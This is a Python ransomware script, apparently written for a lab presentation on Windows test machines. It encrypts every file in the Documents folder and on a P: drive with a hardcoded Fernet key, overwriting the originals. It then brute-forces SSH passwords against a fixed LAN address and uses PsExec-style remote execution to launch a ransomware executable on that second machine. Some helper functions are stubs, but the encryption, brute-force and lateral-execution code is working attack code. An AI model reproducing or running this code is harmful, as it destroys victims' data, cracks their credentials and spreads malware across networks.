#!/usr/bin/env python3
from cryptography.fernet import Fernet #Encrypt files
import os #Send commands to CMD
import paramiko #Bruteforcing SSH connection
import time #Bruteforcing SSH connection
from pypsexec.client import Client #Sending remote commands



#Walkthrough the Documents folder and the P: drive
def fileWalk():
    path= "C:\\Users\\IEUsers\\Documents"
    files=[]
    for r, d, f in os.walk(path):
        for file in f:
            files.append(os.path.join(r,file))
        for f in files:
            encrypt(f)
    fileWalkP()

def fileWalkP():
    path= "P:\\"
    files=[]
    for r, d, f in os.walk(path):
        for file in f:
            files.append(os.path.join(r,file))
        for f in files:
            encrypt(f)


#def encrypt file
def encrypt(fileLocation):
    key = "_TjtaRpjApz2rBn4m22iqH6x3wo_3iDE99HQwKwKt4o="
    f = Fernet(key)
    with open(fileLocation, "rb") as file:
        file_data=file.read()
    encrypt_data=f.encrypt(file_data)
    with open (fileLocation, "wb") as file:
        file.write(encrypt_data)


#play video
def playVideo():
    os.system("cd C:\\Users\\IEUser\\Downloads")
    #CHANGE BACKGROUD


# sniff network 
def sniffNetwork():
    #IPAdress to second Windows 7 machine to speed up presentation
    ipAddress= '192.168.0.60'
    return ipAddress

#bruteforce
def bruteForce(user, ipAddress):
    filepath=open("./passwordlist.txt")
    ssh=paramiko.SSHClient()
    for i in filepath.readlines():
        secret=i.strip("\n")
        try:
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ipAddress, username="IEUser", password=secret)
            return secret
        except:
            time.sleep(1)
            print(secret)

#Transfer
def transferFile():
    os.system("robocopy C:\\Users\\IEUser\Downloads P:\\  ") #P:\\ zip folder
    os.system("robocopy P:\\ C:\\Users\\IEUser\Downloads  ")#Fresh copy to start thr cycle again 


#Remote execute file
def remoteExecute(ipAddress, user, password):
    c = Client(ipAddress, username=user, password=password,  encrypt=False)
    c.connect()
    try:
        c.create_service()
        stdout, stderr, rc = c.run_executable("P:\\registration.exe") #Execute ransomware from P Drive
    except:
        print("done")

def main():
    user= "IEUser"
    fileWalk()
    playVideo()
    ipAddress= sniffNetwork()
    print(ipAddress)
    password=bruteForce(user,ipAddress)
    print(password)
    remoteExecute(ipAddress,user, password)
main()